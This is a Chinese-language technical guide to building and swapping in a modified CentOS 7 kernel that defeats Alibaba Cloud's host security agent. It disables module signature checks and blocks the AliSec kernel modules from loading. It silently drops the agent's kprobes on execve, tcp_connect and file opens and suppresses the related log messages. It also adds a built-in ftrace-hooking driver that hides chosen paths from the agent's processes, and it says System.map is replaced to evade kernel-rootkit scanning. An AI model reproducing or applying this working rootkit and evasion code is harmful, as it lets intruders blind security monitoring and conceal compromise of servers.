# 环境

Linux localhost.localdomain 3.10.0-1160.105.1.el7.x86_64 #1 SMP Thu Dec 7 15:39:45 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# 内核下载地址

CentOS Vault Mirror

https://vault.centos.org/

```
wget https://vault.centos.org/7.9.2009/updates/Source/SPackages/kernel-3.10.0-1160.108.1.el7.src.rpm
```

# 内核编译

注意：官方强烈建议不要以root身份编译内核源码。主要原因是编译过程中可能有对系统文件的修改操作，如果用root编译就可能在你不知情的情况下直接修改了。用普通用户编译过程中，要是有对系统文件的修改，会因权限不足而报错。详见参考“[5] Building Source RPM as non-root under CentOS ”。

- 创建编译内核时的用户名与hostname

用户名、hostname 需要参考正常内核的/proc/version

```
用户名为 : mockbuild
hostname : kbuilder.bsys.centos.org
```

- 以普通用户创建编译rpm所需的基础目录结构

```
$ mkdir -p ~/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}
$ echo '%_topdir %(echo $HOME)/rpmbuild' > ~/.rpmmacros
```

- 安装编译内核所需软件包

```
$ sudo yum install kernel-devel
$ sudo yum install rpm-build redhat-rpm-config asciidoc hmaccalc perl-ExtUtils-Embed pesign xmlto
$ sudo yum install audit-libs-devel binutils-devel elfutils-devel elfutils-libelf-devel
$ sudo yum install ncurses-devel newt-devel numactl-devel pciutils-devel python-devel zlib-devel
```

- 安装内核源码

```
$ rpm -i kernel-3.10.0-514.26.2.el7.src.rpm 2>&1 | grep -v exist
$ cd ~/rpmbuild/SPECS
$ rpmbuild -bp --target=$(uname -m) kernel.spec
现在可以在“~/rpmbuild/BUILD/kernel*/linux*”看到完整的内核源代码了。
```

- 内核编译设置

```
$ cd ~/rpmbuild/BUILD/kernel-*/linux-*/
$ cp -v /boot/config-`uname -r` .config
$ cp -v /usr/src/kernels/`uname -r`/Module.symvers .
$ cp -v /usr/src/kernels/`uname -r`/System.map .
$ cp -v /usr/src/kernels/`uname -r`/vmlinux.id .
```

- 内核小版本号修改

```sh
[r1ng0@localhost linux-3.10.0-1160.el7.x86_64]$ uname -a
Linux localhost.localdomain 3.10.0-1160.105.1.el7.x86_64 #5 SMP Thu Feb 1 01:36:14 EST 2024 x86_64 x86_64 x86_64 GNU/Linux
```

其中 -1160.105.1.el7.x86_64 在Makefile 中添加

```makefile
VERSION = 3
PATCHLEVEL = 10
SUBLEVEL = 0
EXTRAVERSION = -1160.105.1.el7.x86_64
NAME = Unicycling Gorilla
RHEL_MAJOR = 7
RHEL_MINOR = 9
RHEL_RELEASE = 1160
```

- 编译

```
make -j $(nproc)
```

- 安装内核模块（该文章不需要）

```
sudo make modules_install
```

- 安装内核（该文章不需要）

```
sudo make install
```

- 替换内核

```
cp arch/x86/boot/bzImage /boot/vmlinux-xxxxxxxxx
```

==System.map 也要替换，防止安全软件使用该文件进行kernel rootkit查杀==

# 更新内核启动项

centos

```
sudo grub2-mkconfig -o /boot/grub2/grub.cfg
```

# 设置默认内核启动项

centos

```
sudo grubby --set-default /boot/vmlinuz-xxxxx
```

# 编译老版本替换新版本内核会出现如下问题

### needs unknown symbol __x86_return_thunk

__x86_return_thunk ： 防止测信道攻击

# 新版本内核替换老版本内核

也会存在符号找不到的问题

eg:

```
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/fs/cifs/cifs.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/fs/xfs/xfs.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/fs/btrfs/btrfs.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/vfio/vfio.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/vfio/pci/vfio-pci.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/infiniband/core/ib_uverbs.ko.xz needs unknown symbol fget_light
depmod: WARNING: /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/infiniband/core/rdma_ucm.ko.xz needs unknown symbol fget_light
```

# 所以只能平替

能正常启动内核，但是会产生很多dmesg

```
[    5.061525] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.068840] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.075953] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.083747] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.085657] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.088445] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.089954] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.091412] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.102608] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.109879] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.116903] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.124446] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.127577] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.129228] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.130719] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.143753] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.144860] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.151811] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.154122] bridge: filtering via arp/ip/ip6tables is no longer available by default. Update your scripts to load br_netfilter if you need this.
[    5.154702] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.162612] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.201244] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
[    5.205019] Request for unknown module key 'CentOS Linux kernel signing key: e1fdb0e2a7e861a1d1ca80a23dcf0dba3aa4adf5' err -11
```

猜测是直接替换内核后，内核签名变化，导致与原来内核中的模块的签名不一致导致的,解决方法:

修改kernel/module_signing.c中的 mod_verify_sig 函数

```c
/*
 * Verify the signature on a module.
 */
int mod_verify_sig(const void *mod, unsigned long *_modlen)
{
	struct public_key_signature *pks;
	struct module_signature ms;
	struct key *key;
	const void *sig;
	size_t modlen = *_modlen, sig_len;
	int ret;

	pr_devel("==>%s(,%zu)\n", __func__, modlen);

	if (modlen <= sizeof(ms))
		return -EBADMSG;

	memcpy(&ms, mod + (modlen - sizeof(ms)), sizeof(ms));
	modlen -= sizeof(ms);

	sig_len = be32_to_cpu(ms.sig_len);
	if (sig_len >= modlen)
		return -EBADMSG;
	modlen -= sig_len;
	if ((size_t)ms.signer_len + ms.key_id_len >= modlen)
		return -EBADMSG;
	modlen -= (size_t)ms.signer_len + ms.key_id_len;

	*_modlen = modlen;
	sig = mod + modlen;

	/* For the moment, only support RSA and X.509 identifiers */
	if (ms.algo != PKEY_ALGO_RSA ||
	    ms.id_type != PKEY_ID_X509)
		return -ENOPKG;

	if (ms.hash >= PKEY_HASH__LAST ||
	    !pkey_hash_algo[ms.hash])
		return -ENOPKG;
```

在 

```c
*_modlen = modlen;
sig = mod + modlen;
```

后添加  return 0  直接返回

```c
224     *_modlen = modlen;
225     sig = mod + modlen;
226     return 0;

```

# 阿里云对抗

### 禁止阿里云内核模块加载

阿里云模块有三个，分别是：

- 提供自保护的模块：AliSecGuard
- 提供进程行为监控的模块：AliSecProcFilter64
- 提供网络行为监控的模块：AliSecNetFlt64

在kernel/module.c load_module 函数中，

```c
3527 /* Allocate and load the module: note that size of section 0 is always
3528    zero, and we rely on this for optional sections. */
3529 static int load_module(struct load_info *info, const char __user *uargs,
3530                int flags)
3531 {
3532     struct module *mod;
3533     struct module_ext *mod_ext;
3534     long err;
3535 
3536     err = module_sig_check(info);
3537     if (err)
3538         goto free_copy;
3539 
3540     err = elf_header_check(info);
3541     if (err)
3542         goto free_copy;
3543 
3544     /* Figure out module layout, and allocate all the memory. */
3545     mod = layout_and_allocate(info, flags);
3546     if (IS_ERR(mod)) {
3547         err = PTR_ERR(mod);
3548         goto free_copy;
3549     }
```

后面添加:

```c
3550     if(strncasecmp(mod->name,"AliSec",6) == 0){
3551         err = 0;
3552         goto free_module;
3553     }

```

### 禁止阿里云通过bpf使用kprobe获取进程行为

- 在kernel/kprobes.c 中全局定义

```c
static char *ali_kprobes_name[] = {
    "cn_netlink_send",
    "sys_execve",
    "tcp_connect",
    "unix_stream_connect",
    "do_sys_open"};
```

eg:

```c
  69 static char *ali_kprobes_name[] = {
  70     "cn_netlink_send",
  71     "sys_execve",
  72     "tcp_connect",
  73     "unix_stream_connect",
  74     "do_sys_open"
  75 };  
  76 

```

- 在register_kprobe函数代码后

```c
1534 int __kprobes register_kprobe(struct kprobe *p)
1535 {
1536     int ret;
1537     struct kprobe *old_p;
1538     struct module *probed_mod;
1539     kprobe_opcode_t *addr;
```

添加：

```c
int i;
for(i = 0;i < (sizeof(ali_kprobes_name)/sizeof(char *)) ; i++){
    if( strcmp(p->symbol_name,ali_kprobes_name[i]) == 0 )
    {
        return 0;
    }
}
```

结果为:

```c
1534 int __kprobes register_kprobe(struct kprobe *p)
1535 {
1536     int ret;
1537     struct kprobe *old_p;
1538     struct module *probed_mod;
1539     kprobe_opcode_t *addr;
1540     int i;
1541     for(i = 0;i < (sizeof(ali_kprobes_name)/sizeof(char *)) ; i++){
1542         if( strcmp(p->symbol_name,ali_kprobes_name[i]) == 0 )
1543         {
1544             return 0;
1545         }
1546     }
1547 
1548     /* Adjust probe address from symbol */
1549     addr = kprobe_addr(p);
1550     if (IS_ERR(addr))
1551         return PTR_ERR(addr);
1552     p->addr = addr;
1553 
1554     ret = check_kprobe_rereg(p);

```

- 修改  unregister_kprobes 函数：

```c
1761 void __kprobes unregister_kprobes(struct kprobe **kps, int num)
1762 {
1763     int i;
1764 
1765     if (num <= 0)
1766         return;
1767     mutex_lock(&kprobe_mutex);
1768     for (i = 0; i < num; i++)
1769         if (__unregister_kprobe_top(kps[i]) < 0)
1770             kps[i]->addr = NULL;
1771     mutex_unlock(&kprobe_mutex);
1772 
1773     synchronize_sched();
1774     for (i = 0; i < num; i++)
1775         if (kps[i]->addr)
1776             __unregister_kprobe_bottom(kps[i]);
1777 }
```

为：

```c
void __kprobes unregister_kprobes(struct kprobe **kps, int num) 
{
    int i;
    int k = 0; 
    if (num <= 0)
        return;
    mutex_lock(&kprobe_mutex);
    for (i = 0; i < num; i++) 
    {    
        for(k = 0;k < (sizeof(ali_kprobes_name)/sizeof(char *));k++){
            if(strcmp(kps[i]->symbol_name,ali_kprobes_name[k]) == 0)
                break;//found
        }    
        if( k != (sizeof(ali_kprobes_name)/sizeof(char *)) ){
            continue;
        }    

        if (__unregister_kprobe_top(kps[i]) < 0) 
            kps[i]->addr = NULL;
    }    
    mutex_unlock(&kprobe_mutex);

    synchronize_sched();
    for (i = 0; i < num; i++){
        for(k = 0;k < (sizeof(ali_kprobes_name)/sizeof(char *));k++){
            if(strcmp(kps[i]->symbol_name,ali_kprobes_name[k]) == 0)
                break;//found
        }    
        if( k != (sizeof(ali_kprobes_name)/sizeof(char *)) ){
            continue;
        }    

        if (kps[i]->addr)
            __unregister_kprobe_bottom(kps[i]);
    }    
}
```

- 需要注释掉  kernel/trace/trace_kprobe.c create_trace_probe 函数中 

```c
	if (is_delete) {
		if (!event) {
			pr_info("Delete command needs an event name.\n");
			return -EINVAL;
		}
		mutex_lock(&probe_lock);
		tp = find_trace_probe(event, group);
		if (!tp) {
			mutex_unlock(&probe_lock);
			pr_info("Event %s/%s doesn't exist.\n", group, event);
			return -ENOENT;
		}
		/* delete an event */
		ret = unregister_trace_probe(tp);
		if (ret == 0)
			free_trace_probe(tp);
		mutex_unlock(&probe_lock);
		return ret;
	}
```
pr_info("Event %s/%s doesn't exist.\n", group, event);这一行

结果为

```c
	if (is_delete) {
		if (!event) {
			pr_info("Delete command needs an event name.\n");
			return -EINVAL;
		}
		mutex_lock(&probe_lock);
		tp = find_trace_probe(event, group);
		if (!tp) {
			mutex_unlock(&probe_lock);
			//pr_info("Event %s/%s doesn't exist.\n", group, event);
			return -ENOENT;
		}
		/* delete an event */
		ret = unregister_trace_probe(tp);
		if (ret == 0)
			free_trace_probe(tp);
		mutex_unlock(&probe_lock);
		return ret;
	}
```

- 需要注释掉 kernel/trace/trace_uprobe.c create_trace_uprobe 中

```c
		if (!tu) {
			mutex_unlock(&uprobe_lock);
			pr_info("Event %s/%s doesn't exist.\n", group, event);
			return -ENOENT;
		}
```

pr_info("Event %s/%s doesn't exist.\n", group, event); 这一行，结果为

```c
		if (!tu) {
			mutex_unlock(&uprobe_lock);
			//pr_info("Event %s/%s doesn't exist.\n", group, event);
			return -ENOENT;
		}
```


- 需要注释掉 kernel/trace/trace_events.c __ftrace_event_enable_disable 函数中

```C
			ret = call->class->reg(call, TRACE_REG_REGISTER, file);
			if (ret) {
				tracing_stop_cmdline_record();
				pr_info("event trace: Could not enable event "
					"%s\n", call->name);
				break;
			}
```

pr_info("event trace: Could not enable event "
					"%s\n", call->name); 这一行，结果为:


```C
			ret = call->class->reg(call, TRACE_REG_REGISTER, file);
			if (ret) {
				tracing_stop_cmdline_record();
				//pr_info("event trace: Could not enable event "
				//	"%s\n", call->name);
				break;
			}
```

### 禁止阿里云扫描特定目录与通过读取/proc 与 /boot 文件获取系统信息

要允许阿里云读取/proc/ali_related_pid 

```c
static const char *ali_monitor_process_comm = "AliYunDunMonito";
static const char *ali_yundun_process_comm  = "AliYunDun";
static const char *ali_update_process_comm  = "AliYunDunUpdate";
static const char *ali_detect_process_comm  = "AliDetect";
static const char *ali_hips_process_comm  = "AliHips";
static const char *ali_net_process_comm  = "AliNet";
static const char *ali_sec_check_process_comm  = "AliSecureCheckA";
```

禁止阿里云读取：

{"/var/tmp/", "/proc/"，"/boot/"};

获取文件信息的ftrace hook点为：

```c
may_open 、vfs_stat
```

### 添加驱动并将其加入到内核代码中

在drivers目录中，创建ltmd目录

在ltmd目录中创建Kconfig 文件:

```
config LTMD_DRIVER
    bool "ltmd driver"
    help
        This is a driver for ltmd
```

在ltmd目录中创建Makefile 文件:

```
obj-$(CONFIG_LTMD_DRIVER) += ltmd.o
```

创建ltmd.c,编写驱动,eg:

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

static int __init myinit(void)
{
	printk("my module init\n");
	return 0;
}

static void __exit myexit(void)
{
	printk("my module exit\n");
}

module_init(myinit);
module_exit(myexit);
MODULE_LICENSE("GPL")
```

修改 drivers/Kconfig , 添加：

```
source "drivers/ltmd/Kconfig"
```

修改 drivers/Makefile , 添加：

```
obj-$(CONFIG_LTMD_DRIVER) += ltmd/
```

修改 内核源代码目录中的 .config 文件 ， 添加：

```c
CONFIG_LTMD_DRIVER=y
```

==使其编译进内核代码,而不是作为一个模块==

### 驱动对抗代码

ltmd.c

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <asm/page.h>
#include <linux/version.h>
#include <asm/cmpxchg.h>
#include <linux/namei.h>
#include <linux/tracepoint.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/inotify.h>
#include <asm/ptrace.h>
#include <linux/types.h>
#include <linux/rwlock_types.h>
#include <linux/binfmts.h>
#include <net/net_namespace.h>
#include <linux/netfilter.h>
#include <linux/list.h>
#include <linux/kthread.h>
#include <linux/miscdevice.h>
#include <linux/signal.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <asm/bitops.h>
#include <linux/dcache.h>
#include <uapi/linux/limits.h>
#include <linux/vmalloc.h>
#include <linux/miscdevice.h>
#include <generated/utsrelease.h>
#include "ltmd.h"

static struct task_struct *auto_set_start_kernel_thread = NULL;
static char kernel_path[256] = {0};

#define	MAX_BAN_PROCESS_COUNT 1000
static DEFINE_MUTEX(all_ban_process_mutex);
static const char *all_ban_process[MAX_BAN_PROCESS_COUNT+10] = {};
static int ban_process_count = 0;

#define MAX_PROTECT_FILE_COUNT 1000
static DEFINE_MUTEX(all_protect_file_mutex);
static const char *all_protect_file[MAX_PROTECT_FILE_COUNT+10] = {};
static int protect_file_count = 0;

static void free_all_protect_file(void)
{
	int i = 0;
	mutex_lock(&all_protect_file_mutex);
	
	for(i = 0;i<protect_file_count;i++){
		kfree(all_protect_file[i]);
	}
	protect_file_count = 0;

	mutex_unlock(&all_protect_file_mutex);
}

static char *get_all_protect_file(void)
{
	const int max_buf_size = 0x1000;
	char *buf;
	int i;
	int offset = 0;
	
	mutex_lock(&all_protect_file_mutex);
	
	if(protect_file_count == 0){
#ifdef DEBUG
		printk("get_all_protect_file func: protect_file_count == 0\n");
#endif
		mutex_unlock(&all_protect_file_mutex);
		return NULL;
	}
	
	buf = kmalloc(max_buf_size + 1,GFP_KERNEL);
	if(buf == NULL){
#ifdef DEBUG
		printk("get_all_protect_file func: kmalloc error\n");
#endif
		mutex_unlock(&all_protect_file_mutex);
		return NULL;
	}
	memset(buf,0,max_buf_size + 1);

	for(i = 0;i<protect_file_count;i++){
		if(offset < max_buf_size){
			offset += snprintf(buf + offset,max_buf_size - offset,"%s\n",all_protect_file[i]);
		}
	}

	mutex_unlock(&all_protect_file_mutex);

	return buf;
}

static int add_protect_file(char *protect_file)
{
	void *ptr;
	mutex_lock(&all_protect_file_mutex);
	
	if(protect_file_count == MAX_PROTECT_FILE_COUNT){
#ifdef DEBUG
		printk("add_protect_file func: protect_file_count == MAX_PROTECT_FILE_COUNT\n");
#endif
		mutex_unlock(&all_protect_file_mutex);
		return -EFAULT;
	}

	ptr = kmalloc(strlen(protect_file)+1,GFP_KERNEL);
	if(ptr == NULL){
#ifdef DEBUG
		printk("add_protect_file func: kmalloc error\n");
#endif
		mutex_unlock(&all_protect_file_mutex);
		return -ENOMEM;
	}
	memset(ptr,0,strlen(protect_file)+1);
	memcpy(ptr,protect_file,strlen(protect_file));
	
	all_protect_file[protect_file_count++] = (const char *)ptr;

	mutex_unlock(&all_protect_file_mutex);
#ifdef DEBUG
	printk("add_protect_file func: name:%s count:%d\n",(char*)ptr,protect_file_count);	
#endif

	return 0;
}

static int del_protect_file(char *protect_file)
{
	int i = 0;
	mutex_lock(&all_protect_file_mutex);
	
	for(i = 0;i<protect_file_count;i++){
		if(strcmp(all_protect_file[i],protect_file) == 0)
			break;
	}

	if(i != protect_file_count){
#ifdef DEBUG
		printk("del_protect_file func: found file\n");
#endif
		kfree(all_protect_file[i]);
		memcpy(all_protect_file + i,all_protect_file + i + 1,(protect_file_count-i-1)*sizeof(char *));
		protect_file_count--;
	}


	mutex_unlock(&all_protect_file_mutex);
	return 0;
}

static void free_all_ban_process(void)
{
	int i = 0;
	mutex_lock(&all_ban_process_mutex);
	for(i = 0;i<ban_process_count;i++){
		kfree(all_ban_process[i]);
	}
	ban_process_count = 0;
	mutex_unlock(&all_ban_process_mutex);
}

static char *get_all_ban_process(void)
{
	const int max_buf_size = 0x1000;
	char *buf;
	int i;
	int offset = 0;
	
	mutex_lock(&all_ban_process_mutex);
	
	if(ban_process_count == 0){
#ifdef DEBUG
		printk("get_all_ban_process func: ban_process_count == 0 \n");
#endif
		mutex_unlock(&all_ban_process_mutex);
		return NULL;
	}
	
	buf = kmalloc(max_buf_size + 1,GFP_KERNEL);
	if(buf == NULL){
#ifdef DEBUG
		printk("get_all_ban_process func: kmalloc error \n");
#endif
		mutex_unlock(&all_ban_process_mutex);
		return NULL;
	}
	memset(buf,0,max_buf_size + 1);

	for(i = 0;i<ban_process_count;i++){
		if(offset < max_buf_size){
			offset += snprintf(buf + offset,max_buf_size - offset,"%s\n",all_ban_process[i]);
		}
	}

	mutex_unlock(&all_ban_process_mutex);

	return buf;
}

static int add_ban_process(char *ban_process)
{
	void *ptr;
	mutex_lock(&all_ban_process_mutex);
	
	if(ban_process_count == MAX_BAN_PROCESS_COUNT){
#ifdef DEBUG
		printk("add_ban_process func: ban_process_count == MAX_BAN_PROCESS_COUNT\n");
#endif
		mutex_unlock(&all_ban_process_mutex);
		return -EFAULT;
	}

	ptr = kmalloc(strlen(ban_process)+1,GFP_KERNEL);
	if(ptr == NULL){
#ifdef DEBUG
		printk("add_ban_process func: kmalloc error\n");
#endif
		mutex_unlock(&all_ban_process_mutex);
		return -ENOMEM;
	}
	memset(ptr,0,strlen(ban_process)+1);
	memcpy(ptr,ban_process,strlen(ban_process));
	
	all_ban_process[ban_process_count++] = (const char *)ptr;

	mutex_unlock(&all_ban_process_mutex);

#ifdef DEBUG
	printk("add_ban_process func: name:%s count:%d\n",(char*)ptr,ban_process_count);	
#endif

	return 0;
}

static int del_ban_process(char *ban_process)
{
	int i = 0;
	mutex_lock(&all_ban_process_mutex);
	
	for(i = 0;i<ban_process_count;i++){
		if(strcmp(all_ban_process[i],ban_process) == 0)
			break;
	}

	if(i != ban_process_count){
#ifdef DEBUG
		printk("del_ban_process func: found \n");
#endif
		kfree(all_ban_process[i]);
		memcpy(all_ban_process + i,all_ban_process+i+1,(ban_process_count-i-1)*sizeof(char *));
		ban_process_count--;
	}


	mutex_unlock(&all_ban_process_mutex);

	return 0;
}

//kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void)
{
	register_kprobe(&kp);
	my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
}

//ftrace
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

/*
 * There are two ways of preventing vicious recursive loops when hooking:
 * - detect recusion using function return address (USE_FENTRY_OFFSET = 0)
 * - avoid recusion by jumping over the ftrace call (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

/**
 *  struct ftrace_hook    describes the hooked function
 *  
 * @name:           the name of the hooked function
 *     
 * @function:       the address of the wrapper function that will be called instead of
 *                  the hooked function
 *       
 * @original:           a pointer to the place where the address
 *                      of the hooked function should be stored, filled out during installation of
 *                      the hook
 *            
 * @address:        the address of the hooked function, filled out during installation
 *                  of the hook
 *              
 * @ops:                ftrace service information, initialized by zeros;
 *                 		initialization is finished during installation of the hook
 */

struct ftrace_hook
{
    const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original)     \
    {                                         \
	        .name = (_name),                  \
			.function = (_function),          \
			.original = (_original),          \
	}

static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = my_kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk("unresolved symbol: %s\n", hook->name);
        return -1;
    }

    *((unsigned long *)hook->original) = hook->address;

    return 0;
}

static asmlinkage int fh_vfs_fstatat(int dfd, const char __user *filename, struct kstat *stat, int flag);
static asmlinkage int fh_may_open(struct path *path, int acc_mode, int flag);
static int with_module_fh_wrapper_func(unsigned long parent_ip)
{
	unsigned long may_open = (unsigned long)fh_may_open;
	unsigned long vfs_fs_statat = (unsigned long)fh_vfs_fstatat;
	
	if( ( (may_open <= parent_ip)      && (parent_ip <= may_open + 0x1000)       ) ||
		( (vfs_fs_statat <= parent_ip) && (parent_ip <= (vfs_fs_statat + 0x1000)))
	){
		return 1;
	}

	return 0;
}
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if( !with_module_fh_wrapper_func(parent_ip) )
	{
		regs->ip = (unsigned long)hook->function;	
	}
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    err = resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
    {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err)
    {
        printk("register_ftrace_function() failed: %d\n", err);

        /* Don’t forget to turn off ftrace in case of an error. */
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);

        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err)
    {
        printk("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
    {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static int get_pid_by_name(const char *proc_name)
{
	struct task_struct *task;
	int pid = -1;

	rcu_read_lock();
	
	for_each_process(task){
		if(strcmp(task->comm,proc_name) == 0){
			pid = task->pid;
			break;
		}
	}

	rcu_read_unlock();

	return pid;
}

//0 allow
//-1 not allow
static int check_allow_access(char *path)
{
	int prog_hit = 0;
	int path_hit = 0;
	int pid_in_path = 0;
	int pid;
	int i = 0;

	if(!get_current())
		return -1;

	mutex_lock(&all_protect_file_mutex);
	mutex_lock(&all_ban_process_mutex);
	
	for(i = 0; i < protect_file_count; i++){
		if ( (strlen(path) >= strlen(all_protect_file[i])) && (strncmp(path, all_protect_file[i], strlen(all_protect_file[i])) == 0) )
		{
			path_hit = 1;
			break;
		}
	}

	for(i = 0; i < ban_process_count;i++){
		if ( (strlen(get_current()->comm) >= strlen(all_ban_process[i])) && (strncmp(get_current()->comm, all_ban_process[i], strlen(all_ban_process[i])) == 0) )
		{
			prog_hit = 1;
			break;
		}
	}

	if( (prog_hit==1) && (path_hit==1) && (strncmp(path,"/proc",strlen("/proc"))) == 0){
		if(sscanf(path,"/proc/%d",&pid_in_path) == 1){
			for(i = 0;i<ban_process_count;i++){
				pid = get_pid_by_name(all_ban_process[i]);
				if( (pid != -1) && (pid == pid_in_path ) )
				{
					path_hit = 0;
					break;
				}
			}
		}
	}
	if( (prog_hit==1) && (path_hit==1) && (strncmp(path,"/proc/self",strlen("/proc/self"))) == 0){
		path_hit = 0;
	}
	

	mutex_unlock(&all_ban_process_mutex);
	mutex_unlock(&all_protect_file_mutex);

	if( (prog_hit == 1) && (path_hit == 1) ){
		return -1;
	}else{
		return 0;
	}

}

static asmlinkage int (*real_may_open)(struct path *path, int acc_mode, int flag);
static asmlinkage int fh_may_open(struct path *path, int acc_mode, int flag)
{
	int ret;
    char *cp;
    char path_buf[256] = {0};

    cp = d_path(path, path_buf, sizeof(path_buf));
    if (!IS_ERR(cp))
    {
        if ((check_allow_access(cp)) == 0)
        {
            ret = real_may_open(path, acc_mode, flag);
        }
        else
        {
            ret = -ENOENT;
        }
    }
    else
    {
        ret = real_may_open(path, acc_mode, flag);
    }

	return ret;
}

static asmlinkage int (*real_vfs_fstatat)(int dfd, const char __user *filename, struct kstat *stat, int flag);
static asmlinkage int fh_vfs_fstatat(int dfd, const char __user *filename, struct kstat *stat, int flag)
{
    int ret;
    int error;
    struct path path;
    char *cp;
    unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_AUTOMOUNT;
    char path_buf[256] = {0};

    error = user_path_at(dfd, filename, lookup_flags, &path);

    if (error)
    {
        ret = real_vfs_fstatat(dfd, filename, stat, flag);
        return ret;
    }
    else
    {
        cp = d_path(&path, path_buf, sizeof(path_buf));
        if (!IS_ERR(cp))
        {
            if ((check_allow_access(cp)) == 0)
            {
                ret = real_vfs_fstatat(dfd, filename, stat, flag);
            }
            else
            {
                ret = -ENOENT;
            }
        }
        else
        {
            ret = real_vfs_fstatat(dfd, filename, stat, flag);
        }
    }

    path_put(&path);
    return ret;
}

static struct ftrace_hook my_ftrace_hooked_functions[] = {
    HOOK("may_open", fh_may_open, &real_may_open),
